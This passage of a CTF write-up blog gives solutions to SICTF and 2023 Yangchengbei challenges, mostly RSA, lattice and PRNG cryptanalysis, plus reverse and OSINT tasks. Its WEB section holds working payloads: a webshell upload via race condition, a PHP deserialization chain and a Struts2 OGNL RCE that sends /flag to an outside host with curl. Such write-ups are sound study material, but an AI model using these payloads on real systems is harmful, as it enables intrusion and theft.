SICTF&#123;hhh!!franklin_reiter_is_easy&#125; ​ small_e直接小 $e$ 攻击 1234567import gmpy2e = 3c = m = gmpy2.iroot(c,3)[0]print(bytes.fromhex(hex(m)[2:]))# b&#x27;SICTF&#123;2ca8e589-4a31-4909-80f0-9ecfc8f8cb37&#125;&#x27; ​ easy_math根据 $\\begin{cases} h_1=a_1p+b_1q \\newline h_2=a_2p+b_2q \\end{cases}$ 消掉 $p$，有 $(a_2b_1-a_1b_2)q=a_2h_1-a_1h_2$，由于 $a_1,a_2$ 为素数且 $a_1,a_2 \\in [2^{12},2^{13})$，又 $\\gcd(a_2h_1-a_1h_2,n)=q$，爆破 $a_1,a_2$ 即可求 $q$。 1234567891011121314151617181920n = h1 = h2 = c = primes = []for k in Primes(): if k&gt;=2^12: primes.append(k) if k&gt;2^13: breakfor i in range(len(primes)): for j in range(len(primes)): x = abs(h1*primes[i]-h2*primes[j]) q = gcd(x,n) if q &gt; 1: print(primes[i],primes[j],q)# 5953 4241 8358483529150257619757085065272214074629139403939506404958882156637928949429486966229697771519458532207667137987443291952917150640467328461391364839768437 常规解RSA，得flag：SICTF&#123;452aebb6-9c16-441a-ac42-fc608bf6063f&#125; ​ WEB[签到]IncludePHP伪协议读 /flag： ?SICTF=php://filter/resource=/flag ​ Baby_PHPPOST /?k%20e%20y=123%0a&amp;b=phpinfo(); command=print_r(file_get_contents(array_rand(array_flip(scandir(current(localeconv())))))); ​ 你能跟得上我的speed吗条件竞争。 上传 1.php ，内容为 &lt;?php system(&quot;cat /flag&quot;);，bp抓包；访问 uploads/1.php ，bp抓包。 上面两个包分别在bp intruder用null payloads爆破1000次，找到 uploads/1.php 爆破结果中响应码200的那个数据包，即为flag值。 ​ painStruts2基于OGNL的RCE漏洞，参考https://www.freebuf.com/vuls/217482.html S2-012的payload可用： 1(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;bash&quot;, &quot;-c&quot;, &quot;curl http://[IP]:[PORT]/?p=`cat /flag`&quot;&#125;)).start() unicode编码绕过黑名单关键字过滤，再根据源码的urldecode，urlencode一层，payload： /start?payload=%5Cu0028%5Cu006e%5Cu0065%5Cu0077%5Cu0020%5Cu006a%5Cu0061%5Cu0076%5Cu0061%5Cu002e%5Cu006c%5Cu0061%5Cu006e%5Cu0067%5Cu002e%5Cu0050%5Cu0072%5Cu006f%5Cu0063%5Cu0065%5Cu0073%5Cu0073%5Cu0042%5Cu0075%5Cu0069%5Cu006c%5Cu0064%5Cu0065%5Cu0072%5Cu0028%5Cu006e%5Cu0065%5Cu0077%5Cu0020%5Cu006a%5Cu0061%5Cu0076%5Cu0061%5Cu002e%5Cu006c%5Cu0061%5Cu006e%5Cu0067%5Cu002e%5Cu0053%5Cu0074%5Cu0072%5Cu0069%5Cu006e%5Cu0067%5Cu005b%5Cu005d%5Cu007b%5Cu0022%5Cu0062%5Cu0061%5Cu0073%5Cu0068%5Cu0022%5Cu002c%5Cu0020%5Cu0022%5Cu002d%5Cu0063%5Cu0022%5Cu002c%5Cu0020%5Cu0022%5Cu0063%5Cu0075%5Cu0072%5Cu006c%5Cu0020%5Cu0068%5Cu0074%5Cu0074%5Cu0070%5Cu003a%5Cu002f%5Cu002f%5Cu0031%5Cu0032%5Cu0030%5Cu002e%5Cu0032%5Cu0035%5Cu002e%5Cu0031%5Cu0030%5Cu0034%5Cu002e%5Cu0032%5Cu0030%5Cu0039%5Cu003a%5Cu0038%5Cu0038%5Cu0038%5Cu0038%5Cu002f%5Cu003f%5Cu0070%5Cu003d%5Cu0060%5Cu0063%5Cu0061%5Cu0074%5Cu0020%5Cu002f%5Cu0066%5Cu006c%5Cu0061%5Cu0067%5Cu0060%5Cu0022%5Cu007d%5Cu0029%5Cu0029%5Cu002e%5Cu0073%5Cu0074%5Cu0061%5Cu0072%5Cu0074%5Cu0028%5Cu0029 得到结果： 210.44.151.51 - - [09/Sep/2023 12:30:07] &quot;GET /?p=SICTF169e8299-2241-4b2e-9726-1c32f212ca51 HTTP/1.1&quot; 200 - ​ RCEPOST / code=include &quot;/flag&quot;; ​ 我全都要写反序列化链： 1234567891011121314151617181920from phpserialize import serializeclass P: public_MyLover=&#x27;x&#x27; class B: public_i=&#x27;1&#x27; public_nogame=P() class A: public_Aec=B() public_girl=[&#x27;1&#x27;] public_boy=[&#x27;2&#x27;] class B: public_pop=A() print(serialize(B()))# O:1:&quot;B&quot;:1:&#123;s:3:&quot;pop&quot;;O:1:&quot;A&quot;:3:&#123;s:3:&quot;Aec&quot;;O:1:&quot;B&quot;:2:&#123;s:1:&quot;i&quot;;s:1:&quot;1&quot;;s:6:&quot;nogame&quot;;O:1:&quot;P&quot;:1:&#123;s:7:&quot;MyLover&quot;;s:1:&quot;x&quot;;&#125;&#125;s:3:&quot;boy&quot;;a:1:&#123;i:0;s:1:&quot;2&quot;;&#125;s:4:&quot;girl&quot;;a:1:&#123;i:0;s:1:&quot;1&quot;;&#125;&#125;&#125; POST ?A_B_C=O:1:&quot;B&quot;:1:&#123;s:3:&quot;pop&quot;;O:1:&quot;A&quot;:3:&#123;s:3:&quot;Aec&quot;;O:1:&quot;B&quot;:2:&#123;s:1:&quot;i&quot;;s:1:&quot;1&quot;;s:6:&quot;nogame&quot;;O:1:&quot;P&quot;:1:&#123;s:7:&quot;MyLover&quot;;s:1:&quot;x&quot;;&#125;&#125;s:3:&quot;boy&quot;;a:1:&#123;i:0;s:1:&quot;2&quot;;&#125;s:4:&quot;girl&quot;;a:1:&#123;i:0;s:1:&quot;1&quot;;&#125;&#125;&#125; cmd=system(&quot;cat /flag&quot;); ​ REVERSE[签到]PYCpyc反编译，得flag。 SICTF&#123;07e278e7-9d66-4d90-88fc-8bd61e490616&#125; ​ Myobject动调，发现是RC4，key为 SIFLAG，密文为 3027D30E5A22CF47476B0BE58D53BA99C3850707011C7710FE889F。 解密RC4，得flag：SICTF&#123;wow_you_get_the_flag&#125;。 ​ chbase搜索字符串得 码表：ZYXWVUTSRQPONMLKJIHGFEDCBAabcdefghijklmnopqrstuvwxyz0123456789+/ 密文：F0lWEVA7BmUzAGB0C2UuAU9hbnIpATEidDdnACQ9 base64解码得flag：SICTF&#123;base64_and_antidebugger&#125; ​ 不一样的base64pyinstxtractor解包得到111.pyc，反编译得到： U0lDVEZ7OGUwZDM1OGQtOGI5ZC00ODY2LTliMDItNjc0OWIwN2FkMDlhfQAA base64解码得flag：SICTF&#123;8e0d358d-8b9d-4866-9b02-6749b07ad09a&#125; ​ javacodeJVM字节码，参考 两张图让你快速读懂JVM字节码指令 理加密逻辑，已知key和密文c，关键运算为： c[i] = (((m[i]^m[i+1])-k[i])^k[i])%256 还原： 1234567891011121314151617c = [148,136,151,234,177,48,226,234,214,177,168,176,151,250,19,20,253,52,72,176,170,140,176,236,54,231,212,237,135,151,150,135,217,231,229,32,90]k = list(b&#x27;SICTF2023&#x27;)import stringdic = string.ascii_letters+string.digits+&#x27;_&#123;&#125;&#x27;m = [83]for i in range(len(c)): for j in range(33,127): if (((m[-1]^j)-k[i%len(k)])^k[i%len(k)])%256 == c[i]: m.append(j) breakprint(bytes(m))# b&#x27;SICTF&#123;OMG_j@vac0de_1s_sO_interesting!&#125;&#x27; ​ PWN[签到]Shop整数溢出漏洞，输入-1得flag。 ​ FORENSICS购物之旅百度识图+关键字搜索。 SICTF&#123;北京市_顺义区_新顺南大街_北京华联顺义金街购物中心&#125; ​ 天桥辨认出梧桐树，再关键字搜索城市。 SICTF&#123;陕西省西安市碑林区友谊路&#125; ​ 美女姐姐O.o百度识图+关键字搜索。 SICTF&#123;福建省福州市仓山区烟台山公园&#125; ​ 宝塔镇河妖百度识图+关键字搜索。 SICTF&#123;山东省济宁市汶上县太子灵踪塔&#125;","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2023赛","slug":"2023赛","permalink":"https://lazzzaro.github.io/tags/2023%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"2023年羊城杯网络安全大赛","slug":"match-2023年羊城杯网络安全大赛","date":"2023-09-02T15:19:34.000Z","updated":"2023-09-03T02:23:43.500Z","comments":true,"path":"2023/09/02/match-2023年羊城杯网络安全大赛/","permalink":"https://lazzzaro.github.io/2023/09/02/match-2023%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/","excerpt":"","text":"​ 竞赛时间 2023-09-02 09:00:00~2023-09-03 09:00:00 竞赛简介 目前我国网民规模已突破9亿，成为名副其实的网络大国，但我国与网络强国相比还有一定距离。习近平总书记指出：要建立高素质网络安全和信息化人才队伍，将我国建设成网络强国。建设网络强国需要高素质的网络安全和信息化人才队伍。网络安全人才是国家网络安全建设的核心资源，其数量、质量和结构是衡量国家网络安全软实力和竞争力的重要标志。 为积极响应国家网络强国建设对网络安全人才的需求，提升人民的网络安全知识水平和实践力，特举办2023年“羊城杯”网络安全大赛。 MISCEZ_misc 一道简单的misc捏.. 16进制查看，末尾修改 504b0403 为 504b0304 后提取出zip文件，得到一串密文 vzbtrvplnnvphsqkxsiqibroou。 根据图片名Grons和压缩包内文件名feld，组合得到Gronsfeld为一种密码，爆破密钥得到提示：try to think the s nipping tools，为Win10/11截图工具漏洞aCropalypse（CVE-2023-28303）。 利用Acropalypse Multi Tool工具修复png宽高，还原得到flag： ​ CRYPTODanger_RSA 看似简单的rsa 1234567891011121314151617181920212223242526from Crypto.Util.number import *m = bytes_to_long(flag)def get_key(a, nbit): assert a &gt;= 2 while True: X = getRandomInteger(nbit // a) s = getRandomRange(pow(2, a ** 2 - a + 4), pow(2, a ** 2 - a + 5)) p = X ** a + s if isPrime(p): return (p, s)p, s = get_key(a, 1024)q, t = get_key(a, 1024)N = p * qe = s * tc = pow(m, e, N)print(&quot;N =&quot;, N)print(&quot;e =&quot;, e)print(&quot;c =&quot;, c)# N = 20289788565671012003324307131062103060859990244423187333725116068731043744218295859587498278382150779775620675092152011336913225797849717782573829179765649320271927359983554162082141908877255319715400550981462988869084618816967398571437725114356308935833701495015311197958172878812521403732038749414005661189594761246154666465178024563227666440066723650451362032162000998737626370987794816660694178305939474922064726534186386488052827919792122844587807300048430756990391177266977583227470089929347969731703368720788359127837289988944365786283419724178187242169399457608505627145016468888402441344333481249304670223# e = 11079917583# c = 13354219204055754230025847310134936965811370208880054443449019813095522768684299807719787421318648141224402269593016895821181312342830493800652737679627324687428327297369122017160142465940412477792023917546122283870042482432790385644640286392037986185997262289003477817675380787176650410819568815448960281666117602590863047680652856789877783422272330706693947399620261349458556870056095723068536573904350085124198592111773470010262148170379730937529246069218004969402885134027857991552224816835834207152308645148250837667184968030600819179396545349582556181916861808402629154688779221034610013350165801919342549766 $N$ 为2038位，$p,q$ 至少为1024位，且生成函数 get_key() 的 $p=X^a+s$ 有 $X^a \\gt\\gt s$，且 $e$ 为34位，$s&lt;e$，故 $a$ 值不会太大，尝试爆破 $a$ 值： 1234567891011121314151617181920212223from Crypto.Util.number import *N = 20289788565671012003324307131062103060859990244423187333725116068731043744218295859587498278382150779775620675092152011336913225797849717782573829179765649320271927359983554162082141908877255319715400550981462988869084618816967398571437725114356308935833701495015311197958172878812521403732038749414005661189594761246154666465178024563227666440066723650451362032162000998737626370987794816660694178305939474922064726534186386488052827919792122844587807300048430756990391177266977583227470089929347969731703368720788359127837289988944365786283419724178187242169399457608505627145016468888402441344333481249304670223e = 11079917583c = 13354219204055754230025847310134936965811370208880054443449019813095522768684299807719787421318648141224402269593016895821181312342830493800652737679627324687428327297369122017160142465940412477792023917546122283870042482432790385644640286392037986185997262289003477817675380787176650410819568815448960281666117602590863047680652856789877783422272330706693947399620261349458556870056095723068536573904350085124198592111773470010262148170379730937529246069218004969402885134027857991552224816835834207152308645148250837667184968030600819179396545349582556181916861808402629154688779221034610013350165801919342549766def get_key(a, nbit): assert a &gt;= 2 while True: X = getRandomInteger(nbit // a) s = pow(2, a ** 2 - a + 5) # 取可能的最大值 p = X ** a + s if isPrime(p): return (p, s) for a in range(2,20): p, s = get_key(a,1024) if s.bit_length() &lt; 34: # s &lt; e print(a, p.bit_length(), s.bit_length()) # 2 1021 8# 3 1012 12# 4 1020 18 $a=4$ 时满足 $e=s \\cdot t$ 的位数条件，有 $s \\in [2^{a^2-a+4},2^{a^2-a+5})=[65536,131072)$。 分解 $e$，尝试其各因子，求 $s,t$： 123456789101112131415a = 4# s ~ (65536,131072)# e = 3 · 7^2 · 19 · 691 · 5741ed = [1, 3, 7, 19, 21, 49, 57, 133, 147, 399, 691, 931, 2073, 2793, 4837, 5741, 13129, 14511, 17223, 33859, 39387, 40187, 91903, 101577, 109079, 120561, 275709, 281309, 327237, 643321, 763553, 843927, 1929963, 2290659, 3967031, 5344871, 11901093, 16034613, 27769217, 75373589, 83307651, 194384519, 226120767, 527615123, 583153557, 1582845369, 3693305861, 11079917583]for k in ed: if k in range(65536,131072): s = k t = e // s if t in range(65536,131072) and t &gt; s: print((s,t)) # (91903, 120561)# (101577, 109079) 带入有 $p=X_1^4+s,q=X_2^4+t$，又 $X_1^4 \\gt\\gt s,X_2^4 \\gt\\gt t$，有 $(X_1X_2)^4 \\approx N$，即 $X_1X_2= \\lfloor\\sqrt[4]{N}\\rfloor$。结合 $N=pq=(X_1^4+s)(X_2^4+t)$，解 $X_1,X_2$： 1234567891011121314151617181920212223242526272829303132333435363738import gmpy2st = [(91903, 120561), (101577, 109079)]N = 20289788565671012003324307131062103060859990244423187333725116068731043744218295859587498278382150779775620675092152011336913225797849717782573829179765649320271927359983554162082141908877255319715400550981462988869084618816967398571437725114356308935833701495015311197958172878812521403732038749414005661189594761246154666465178024563227666440066723650451362032162000998737626370987794816660694178305939474922064726534186386488052827919792122844587807300048430756990391177266977583227470089929347969731703368720788359127837289988944365786283419724178187242169399457608505627145016468888402441344333481249304670223e = 11079917583c = 13354219204055754230025847310134936965811370208880054443449019813095522768684299807719787421318648141224402269593016895821181312342830493800652737679627324687428327297369122017160142465940412477792023917546122283870042482432790385644640286392037986185997262289003477817675380787176650410819568815448960281666117602590863047680652856789877783422272330706693947399620261349458556870056095723068536573904350085124198592111773470010262148170379730937529246069218004969402885134027857991552224816835834207152308645148250837667184968030600819179396545349582556181916861808402629154688779221034610013350165801919342549766s = int(st[0][0]) # 另一组无解t = int(st[0][1])y = int(gmpy2.iroot(N,4)[0])P.&lt;x1,x2&gt; = PolynomialRing(ZZ)f1 = (x1^4+s)*(x2^4+t)-Nf2 = x1*x2-yg = f1.resultant(f2, x2)X2 = g.univariate_polynomial().roots()[0][0]X1 = y//X2print((X1,X2))p = X1^4+sq = X2^4+tif not is_prime(p): p = X2^4+s q = X1^4+tprint(is_prime(p))print(is_prime(q))# AMMfor mp in GF(p)(c).nth_root(e, all=True): for mq in GF(q)(c).nth_root(e, all=True): m = crt([ZZ(mp), ZZ(mq)], [p, q]) try: res = bytes.fromhex(hex(m)[2:]) if res.isascii(): print(res) except: pass # b&#x27;DASCTF&#123;C0nsTruct!n9_Techn1qUe2_f0r_RSA_Pr1me_EnC2ypt10N&#125;&#x27; ​ Easy_3L 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from gmpy2 import *from Crypto.Util.number import *from secret import flagm = bytes_to_long(flag)def get_key(): p = getPrime(1400) f = getRandomNBitInteger(1024) while True: q = getPrime(512) if gcd(f, q) != 1: continue else: break h = (invert(f, p) * q) % p return p, hdef encrypt1(m): a = getPrime(250) b = getRandomNBitInteger(240) n = getPrime(512) seed = m s = [0] * 6 s[0] = seed for i in range(1, 6): s[i] = (s[i - 1] * a + b) % n return sdef encrypt2(msg, p, h): s = getRandomNBitInteger(512) c = (s * h + msg) % p return cs = encrypt1(m)print(&quot;S1 =&quot;, s[1])print(&quot;S2 =&quot;, s[2])print(&quot;S4 =&quot;, s[4])print(&quot;S5 =&quot;, s[5])p, h = get_key()c = encrypt2(s[3], p, h)print(&quot;p =&quot;, p)print(&quot;h =&quot;, h)print(&quot;c =&quot;, c)# S1 = 28572152986082018877402362001567466234043851789360735202177142484311397443337910028526704343260845684960897697228636991096551426116049875141# S2 = 1267231041216362976881495706209012999926322160351147349200659893781191687605978675590209327810284956626443266982499935032073788984220619657447889609681888# S4 = 9739918644806242673966205531575183334306589742344399829232076845951304871478438938119813187502023845332528267974698273405630514228632721928260463654612997# S5 = 9755668823764800147393276745829186812540710004256163127825800861195296361046987938775181398489372822667854079119037446327498475937494635853074634666112736# p = 25886434964719448194352673440525701654705794467884891063997131230558866479588298264578120588832128279435501897537203249743883076992668855905005985050222145380285378634993563571078034923112985724204131887907198503097115380966366598622251191576354831935118147880783949022370177789175320661630501595157946150891275992785113199863734714343650596491139321990230671901990010723398037081693145723605154355325074739107535905777351# h = 2332673914418001018316159191702497430320194762477685969994411366563846498561222483921873160125818295447435796015251682805613716554577537183122368080760105458908517619529332931042168173262127728892648742025494771751133664547888267249802368767396121189473647263861691578834674578112521646941677994097088669110583465311980605508259404858000937372665500663077299603396786862387710064061811000146453852819607311367850587534711# c = 20329058681057003355767546524327270876901063126285410163862577312957425318547938475645814390088863577141554443432653658287774537679738768993301095388221262144278253212238975358868925761055407920504398004143126310247822585095611305912801250788531962681592054588938446210412897150782558115114462054815460318533279921722893020563472010279486838372516063331845966834180751724227249589463408168677246991839581459878242111459287 encrypt1() 和 encrypt2() 分别是LCG和NTRU。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859h = 2332673914418001018316159191702497430320194762477685969994411366563846498561222483921873160125818295447435796015251682805613716554577537183122368080760105458908517619529332931042168173262127728892648742025494771751133664547888267249802368767396121189473647263861691578834674578112521646941677994097088669110583465311980605508259404858000937372665500663077299603396786862387710064061811000146453852819607311367850587534711p = 25886434964719448194352673440525701654705794467884891063997131230558866479588298264578120588832128279435501897537203249743883076992668855905005985050222145380285378634993563571078034923112985724204131887907198503097115380966366598622251191576354831935118147880783949022370177789175320661630501595157946150891275992785113199863734714343650596491139321990230671901990010723398037081693145723605154355325074739107535905777351c = 20329058681057003355767546524327270876901063126285410163862577312957425318547938475645814390088863577141554443432653658287774537679738768993301095388221262144278253212238975358868925761055407920504398004143126310247822585095611305912801250788531962681592054588938446210412897150782558115114462054815460318533279921722893020563472010279486838372516063331845966834180751724227249589463408168677246991839581459878242111459287v1 = vector(ZZ, [1, h])v2 = vector(ZZ, [0, p])m = matrix([v1,v2]);f, g = m.LLL()[0]f,g = -f,-gprint(f, g)a = f*c % p % gm = a * inverse_mod(f, g) % gS1 = 28572152986082018877402362001567466234043851789360735202177142484311397443337910028526704343260845684960897697228636991096551426116049875141S2 = 1267231041216362976881495706209012999926322160351147349200659893781191687605978675590209327810284956626443266982499935032073788984220619657447889609681888S4 = 9739918644806242673966205531575183334306589742344399829232076845951304871478438938119813187502023845332528267974698273405630514228632721928260463654612997S5 = 9755668823764800147393276745829186812540710004256163127825800861195296361046987938775181398489372822667854079119037446327498475937494635853074634666112736s = [S1,S2,m,S4,S5]from functools import reducefrom math import gcddef egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception(&#x27;modular inverse does not exist&#x27;) else: return x % mdef crack_unknown_increment(states, modulus, multiplier): increment = (states[1] - states[0]*multiplier) % modulus return modulus, multiplier, incrementdef crack_unknown_multiplier(states, modulus): multiplier = (states[2] - states[1]) * modinv(states[1] - states[0], modulus) % modulus return crack_unknown_increment(states, modulus, multiplier)def crack_unknown_modulus(states): diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])] zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])] modulus = abs(reduce(gcd, zeroes)) return crack_unknown_multiplier(states, modulus)n, a, b = crack_unknown_modulus(s)print(n)print(a)print(b)seed = (S1-b)*inverse_mod(a,n)%nprint(bytes.fromhex(hex(seed)[2:]))# b&#x27;DASCTF&#123;NTRU_L0G_a6e_S1mpLe&#125;&#x27; ​ SigninCrypto 随机数真随机吗？如随！ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869from random import *from Crypto.Util.number import *from Crypto.Cipher import DES3from flag import flagfrom key import keyfrom iv import ivimport osimport hashlibimport secretsK1= keyhint1 = os.urandom(2) * 8xor =bytes_to_long(hint1)^bytes_to_long(K1)print(xor)def Rand(): rseed = secrets.randbits(1024) List1 = [] List2 = [] seed(rseed) for i in range(624): rand16 = getrandbits(16) List1.append(rand16) seed(rseed) for i in range(312): rand64 = getrandbits(64) List2.append(rand64) with open(&quot;task.txt&quot;, &quot;w&quot;) as file: for rand16 in List1: file.write(hex(rand16)+ &quot;\\n&quot;) for rand64 in List2: file.write(hex((rand64 &amp; 0xffff) | ((rand64 &gt;&gt; 32) &amp; 0xffff) &lt;&lt; 16) + &quot;\\n&quot;)Rand()K2 = long_to_bytes(getrandbits(64))K3 = flag[:8]KEY = K1 + K2 + K3IV=ivIV1=IV[:len(IV)//2]IV2=IV[len(IV)//2:]digest1 = hashlib.sha512(IV1).digest().hex()digest2 = hashlib.sha512(IV2).digest().hex()digest=digest1+digest2hint2=(bytes_to_long(IV)&lt;&lt;32)^bytes_to_long(os.urandom(8))print(hex(bytes_to_long((digest.encode()))))print(hint2)mode = DES3.MODE_CBCdes3 = DES3.new(KEY, mode, IV)pad_len = 8 - len(flag) % 8padding = bytes([pad_len]) * pad_lenflag += paddingcipher = des3.encrypt(flag)ciphertext=cipher.hex()print(ciphertext)# 334648638865560142973669981316964458403# 0x62343937373634656339396239663236643437363738396663393438316230353665353733303939613830616662663633326463626431643139323130616333363363326631363235313661656632636265396134336361623833636165373964343533666537663934646239396462323666316236396232303539336438336234393737363465633939623966323664343736373839666339343831623035366535373330393961383061666266363332646362643164313932313061633336336332663136323531366165663263626539613433636162383363616537396434353366653766393464623939646232366631623639623230353933643833# 22078953819177294945130027344# a6546bd93bced0a8533a5039545a54d1fee647007df106612ba643ffae850e201e711f6e193f15d2124ab23b250bd6e1 3DES加密，key由三部分组成，$K_1$ 根据不同位数异或得到random的两个字节值，$K_2$ 利用MT19937算法计算输出值，$K_3$ 为flag前八位，即 &#39;DASCTF&#123;&#39;+?，共需爆破1个可见字符；8字节iv，由sha512结果知前后4字节相同，由hint2知，iv右移4字节后错位异或，hint2高4位即为4字节iv值。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import stringimport itertoolsfrom mt19937predictor import MT19937Predictorfrom Crypto.Util.number import *from Crypto.Cipher import DES3from tqdm import *s1 = [...]s2 = [...]predictor = MT19937Predictor()for i in range(312): x = (s1[2*i+1]&lt;&lt;48) | ((s2[i]&gt;&gt;16)&lt;&lt;32) | (s1[2*i]&lt;&lt;16) | (s2[i]&amp;0xffff) predictor.setrandbits(x, 64)K2 = long_to_bytes(predictor.getrandbits(64))print(K2)import hashlibd = bytes.fromhex(&#x27;62343937373634656339396239663236643437363738396663393438316230353665353733303939613830616662663633326463626431643139323130616333363363326631363235313661656632636265396134336361623833636165373964343533666537663934646239396462323666316236396232303539336438336234393737363465633939623966323664343736373839666339343831623035366535373330393961383061666266363332646362643164313932313061633336336332663136323531366165663263626539613433636162383363616537396434353366653766393464623939646232366631623639623230353933643833&#x27;)d1 = d[:128]d2 = d[128:]print(d1)print(d2)print(d1==d2)xor = 334648638865560142973669981316964458403hint2 = 22078953819177294945130027344c = bytes.fromhex(&#x27;a6546bd93bced0a8533a5039545a54d1fee647007df106612ba643ffae850e201e711f6e193f15d2124ab23b250bd6e1&#x27;)hint1 = bytes_to_long(long_to_bytes(xor&gt;&gt;112)*8)K1 = long_to_bytes(hint1 ^ xor)print(K1)iv = hint2&gt;&gt;(8*8)IV = long_to_bytes(iv)*2print(IV)for k3 in trange(128): K3 = b&#x27;DASCTF&#123;&#x27;+bytes([k3]) KEY = K1 + K2 + K3 des3 = DES3.new(KEY, DES3.MODE_CBC, IV) m = des3.decrypt(c) if m.startswith(b&#x27;DASCTF&#123;&#x27;): print(m) # b&#x27;DASCTF&#123;8e5ee461-f4e1-4af2-8632-c9d62f4dc073&#125;&#x27; ​ esyRSA 好像这个RSA有点怪啊！私钥给你了！我的e呢？ 1234567891011121314151617from gmpy2 import invertfrom md5 import md5from secret import p, qe = ?????n = p*qphi = (p-1)*(q-1)d = invert(e, phi)ans = gcd(e,phi)print n, e, dprint &quot;Flag: DASCTF&#123;%s&#125;&quot; %md5(str(p + q)).hexdigest()&quot;&quot;&quot;n = 8064259277274639864655809758868795854117113170423331934498023294296505063511386001711751916634810056911517464467899780578338013011453082479880809823762824723657495915284790349150975180933698827382368698861967973964030509129133021116919437755292590841218316278732797712538885232908975173746394816520256585937380642592772746398646558097588687958541171131704233319344980232942965050635113860017117519166348100569115174644678997805783380130114530824798808098237628247236574959152847903491509751809336988273823686988619679739640305091291330211169194377552925908412183162787327977125388852329089751737463948165202565859373d = 14218766449983537783699024084862960813708451888387858392014856544340557703876299258990323621963898510226357248200187173211121827541826897886277531706124228848229095880229718049075745233893843373402201077890407507625110061976931591596708901741146750809962128820611844426759462132623616118530705745098783140913&quot;&quot;&quot; $n$ 直接给得有问题，重复了一遍，巨坑。 正确的 $n=$80642592772746398646558097588687958541171131704233319344980232942965050635113860017117519166348100569115174644678997805783380130114530824798808098237628247236574959152847903491509751809336988273823686988619679739640305091291330211169194377552925908412183162787327977125388852329089751737463948165202565859373 $n$ 与 $d$ 位数相近，$e$ 很小，Wiener Attack /爆破/求 $e$： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263n = d = def rational_to_contfrac(x,y): # Converts a rational x/y fraction into a list of partial quotients [a0, ..., an] a = x // y pquotients = [a] while a * y != x: x, y = y, x - a * y a = x // y pquotients.append(a) return pquotientsdef convergents_from_contfrac(frac): # computes the list of convergents using the list of partial quotients convs = []; for i in range(len(frac)): convs.append(contfrac_to_rational(frac[0 : i])) return convsdef contfrac_to_rational (frac): # Converts a finite continued fraction [a0, ..., an] to an x/y rational. if len(frac) == 0: return (0,1) num = frac[-1] denom = 1 for _ in range(-2, -len(frac) - 1, -1): num, denom = frac[_] * num + denom, num return (num, denom)def egcd(a, b): if a == 0: return (b, 0, 1) g, x, y = egcd(b % a, a) return (g, y - (b // a) * x, x)def mod_inv(a, m): g, x, _ = egcd(a, m) return (x + m) % mdef isqrt(n): x = n y = (x + 1) // 2 while y &lt; x: x = y y = (x + n // x) // 2 return x def crack_rsa(e, n): frac = rational_to_contfrac(e, n) convergents = convergents_from_contfrac(frac) for (k, d) in convergents: if k != 0 and (e * d - 1) % k == 0: phi = (e * d - 1) // k s = n - phi + 1 # check if x*x - s*x + n = 0 has integer roots D = s * s - 4 * n if D &gt;= 0: sq = isqrt(D) if sq * sq == D and (s + sq) % 2 == 0: return de = crack_rsa(d, n)print(e)# 13521 再已知 $n,e,d$ 求 $p,q$： 1234567891011121314151617181920212223242526import randomimport gmpy2from hashlib import md5def divide_pq(e, d, n): k = e*d - 1 while True: g = random.randint(2, n-1) t = k while True: if t % 2 != 0: break t //= 2 x = pow(g, t, n) if x &gt; 1 and gmpy2.gcd(x-1, n) &gt; 1: p = gmpy2.gcd(x-1, n) return (p, n//p)n = 80642592772746398646558097588687958541171131704233319344980232942965050635113860017117519166348100569115174644678997805783380130114530824798808098237628247236574959152847903491509751809336988273823686988619679739640305091291330211169194377552925908412183162787327977125388852329089751737463948165202565859373d = 14218766449983537783699024084862960813708451888387858392014856544340557703876299258990323621963898510226357248200187173211121827541826897886277531706124228848229095880229718049075745233893843373402201077890407507625110061976931591596708901741146750809962128820611844426759462132623616118530705745098783140913e = 13521p, q = divide_pq(e, d, n)print(&quot;Flag: DASCTF&#123;%s&#125;&quot; %md5(str(p + q).encode()).hexdigest())# Flag: DASCTF&#123;4ae33bea90f030bfddb7ac4d9222ef8f&#125; ​ MCeorpkpleer 这数据都不全要怎么计算呢 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from Crypto.Util.number import *from secret import flagdef pubkey(list, m, w): pubkey_list = [] for i in range(len(e_bin)): pubkey_list.append(w * list[i] % m) return pubkey_listdef e_cry(e, pubkey): pubkey_list = pubkey encode = 0 for i in range(len(e)): encode += pubkey_list[i] * int(e[i]) % m return encodep = getPrime(1024)q = getPrime(1024)n = p * qe = getPrime(64)m = bytes_to_long(flag)c = pow(m, e, n)e_bin = (bin(e))[2:]list = [pow(3, i) for i in range(len(e_bin))]m = getPrime(len(bin(sum(list))) - 1)w = getPrime(64)pubkey = pubkey(list, m, w)en_e = e_cry(e_bin, pubkey)print(&#x27;p = &#123;&#125;\\n&#x27; &#x27;n = &#123;&#125;\\n&#x27; &#x27;c = &#123;&#125;\\n&#x27; &#x27;pubkey = &#123;&#125;\\n&#x27; &#x27;en_e = &#123;&#125;&#x27;.format((p &gt;&gt; 435) &lt;&lt; 435, n, c, pubkey, en_e))&#x27;&#x27;&#x27;p = 139540788452365306201344680691061363403552933527922544113532931871057569249632300961012384092481349965600565669315386312075890938848151802133991344036696488204791984307057923179655351110456639347861739783538289295071556484465877192913103980697449775104351723521120185802327587352171892429135110880845830815744n = 22687275367292715121023165106670108853938361902298846206862771935407158965874027802803638281495587478289987884478175402963651345721058971675312390474130344896656045501040131613951749912121302307319667377206302623735461295814304029815569792081676250351680394603150988291840152045153821466137945680377288968814340125983972875343193067740301088120701811835603840224481300390881804176310419837493233326574694092344562954466888826931087463507145512465506577802975542167456635224555763956520133324723112741833090389521889638959417580386320644108693480886579608925996338215190459826993010122431767343984393826487197759618771c = 